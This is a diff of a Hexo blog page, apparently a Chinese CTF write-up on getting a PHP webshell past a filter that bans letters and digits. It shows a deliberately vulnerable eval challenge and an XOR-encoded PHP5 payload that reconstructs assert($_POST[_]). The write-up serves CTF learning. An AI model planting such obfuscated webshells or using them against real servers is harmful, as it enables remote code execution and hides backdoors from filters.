@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT">
+  <meta name="keywords" content="php_tricks,">
 
 
 
@@ -79,16 +79,20 @@
 
 
 
-<meta name="description" content="一个努力的web手">
-<meta property="og:type" content="website">
-<meta property="og:title" content="蒟蒻的ctf博客">
-<meta property="og:url" content="https://xi4or0uji.github.io/index.html">
+<meta name="description" content="基础版获得webshell很简单，但是遇到waf的时候狗就不是那么有活路了，随便记记以防忘了。先给个题好吧1234&amp;lt;?phpif (!preg_match(&apos;/[A-Za-z0-9]/is&apos;,$_GET[&apos;shell&apos;]))&amp;#123;   eval($_GET[&apos;shell&apos;]);&amp;#125; 可以看到有个eval函数，嗯，是个好东西，但是所有英文和数字都被过滤了怎么办 方法一php有个t">
+<meta name="keywords" content="php_tricks">
+<meta property="og:type" content="article">
+<meta property="og:title" content="没有字母数字获得webshell">
+<meta property="og:url" content="https://xi4or0uji.github.io/2019/01/17/2018-10-19-没有字母数字获得webshell/index.html">
 <meta property="og:site_name" content="蒟蒻的ctf博客">
-<meta property="og:description" content="一个努力的web手">
+<meta property="og:description" content="基础版获得webshell很简单，但是遇到waf的时候狗就不是那么有活路了，随便记记以防忘了。先给个题好吧1234&amp;lt;?phpif (!preg_match(&apos;/[A-Za-z0-9]/is&apos;,$_GET[&apos;shell&apos;]))&amp;#123;   eval($_GET[&apos;shell&apos;]);&amp;#125; 可以看到有个eval函数，嗯，是个好东西，但是所有英文和数字都被过滤了怎么办 方法一php有个t">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://xi4or0uji.github.io/images/webshell/1.png">
+<meta property="og:updated_time" content="2019-01-17T08:18:55.762Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="蒟蒻的ctf博客">
-<meta name="twitter:description" content="一个努力的web手">
+<meta name="twitter:title" content="没有字母数字获得webshell">
+<meta name="twitter:description" content="基础版获得webshell很简单，但是遇到waf的时候狗就不是那么有活路了，随便记记以防忘了。先给个题好吧1234&amp;lt;?phpif (!preg_match(&apos;/[A-Za-z0-9]/is&apos;,$_GET[&apos;shell&apos;]))&amp;#123;   eval($_GET[&apos;shell&apos;]);&amp;#125; 可以看到有个eval函数，嗯，是个好东西，但是所有英文和数字都被过滤了怎么办 方法一php有个t">
+<meta name="twitter:image" content="https://xi4or0uji.github.io/images/webshell/1.png">
 
 
 
@@ -118,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="https://xi4or0uji.github.io/">
+  <link rel="canonical" href="https://xi4or0uji.github.io/2019/01/17/2018-10-19-没有字母数字获得webshell/">
 
 
 
 
 
-  <title>蒟蒻的ctf博客</title>
+  <title>没有字母数字获得webshell | 蒟蒻的ctf博客</title>
   
 
 
@@ -143,8 +147,7 @@
     
   
 
-  <div class="container sidebar-position-left 
-  page-home">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
@@ -247,9 +250,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
 
@@ -279,9 +282,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/01/17/2018-10-19-没有字母数字获得webshell/" itemprop="url">没有字母数字获得webshell</a></h1>
+          <h1 class="post-title" itemprop="name headline">没有字母数字获得webshell</h1>
         
 
         <div class="post-meta">
@@ -353,9 +354,7 @@
       
 
       
-        
-          
-            <h2 id="基础版"><a href="#基础版" class="headerlink" title="基础版"></a>基础版</h2><p>获得webshell很简单，但是遇到waf的时候狗就不是那么有活路了，随便记记以防忘了。<br>先给个题好吧<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/[A-Za-z0-9]/is'</span>,$_GET[<span class="string">'shell'</span>]))&#123;</span><br><span class="line">   <span class="keyword">eval</span>($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+        <h2 id="基础版"><a href="#基础版" class="headerlink" title="基础版"></a>基础版</h2><p>获得webshell很简单，但是遇到waf的时候狗就不是那么有活路了，随便记记以防忘了。<br>先给个题好吧<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/[A-Za-z0-9]/is'</span>,$_GET[<span class="string">'shell'</span>]))&#123;</span><br><span class="line">   <span class="keyword">eval</span>($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>可以看到有个eval函数，嗯，是个好东西，但是所有英文和数字都被过滤了怎么办</p>
 <h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>php有个trick，两个非字母的字符异或在一起可以产生一个字母，所以我们就可以这样去绕过了<br>首先用个assert函数去获得shell，这里注意一点是，php7以前，assert是一个函数，可以通过$a=’assert’;$a(xxxx)这样去动态执行代码，但是到了php7就不行了，下面还会给到php7的方法好吧，不慌</p>
 <p><strong>php5</strong><br>先看一下这样一串代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_=(<span class="string">'%01'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%05'</span>^<span class="string">'`'</span>).(<span class="string">'%12'</span>^<span class="string">'`'</span>).(<span class="string">'%14'</span>^<span class="string">'`'</span>); <span class="comment">// $_='assert';</span></span><br><span class="line">$__=<span class="string">'_'</span>.(<span class="string">'%0D'</span>^<span class="string">']'</span>).(<span class="string">'%2F'</span>^<span class="string">'`'</span>).(<span class="string">'%0E'</span>^<span class="string">']'</span>).(<span class="string">'%09'</span>^<span class="string">']'</span>); <span class="comment">// $__='_POST';</span></span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure></p>
@@ -371,8 +370,6 @@
 <p>如果有多个文件想要特别匹配的话，可以[^x]表示不匹配x，[0-9]表示这个位置的字符是0-9之间的，这样就可以特意匹配了</p>
 <p>参考：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a><br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
 
-          
-        
       
     </div>
     
@@ -387,142 +384,36 @@
 
     <footer class="post-footer">
       
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://xi4or0uji.github.io/2019/01/16/hello-world/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Xi4or0uji">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="蒟蒻的ctf博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/01/16/hello-world/" itemprop="url">Hello World</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-16T19:55:50+08:00">
-                2019-01-16
-              </time>
-            
-
-            
-
-            
-          </span>
-
+        <div class="post-tags">
           
-
+            <a href="/tags/php-tricks/" rel="tag"># php_tricks</a>
           
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
       
 
       
       
-        <div class="post-eof"></div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/01/16/hello-world/" rel="next" title="Hello World">
+                <i class="fa fa-chevron-left"></i> Hello World
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
       
     </footer>
   </div>
@@ -532,10 +423,11 @@
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -543,6 +435,10 @@
 
 
           
+
+  
+
+
 
         </div>
         
@@ -563,8 +459,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
             
@@ -626,6 +531,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基础版"><span class="nav-number">1.</span> <span class="nav-text">基础版</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#方法一"><span class="nav-number">1.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法二"><span class="nav-number">1.2.</span> <span class="nav-text">方法二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#方法三"><span class="nav-number">1.3.</span> <span class="nav-text">方法三</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#升级版"><span class="nav-number">2.</span> <span class="nav-text">升级版</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -766,6 +687,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
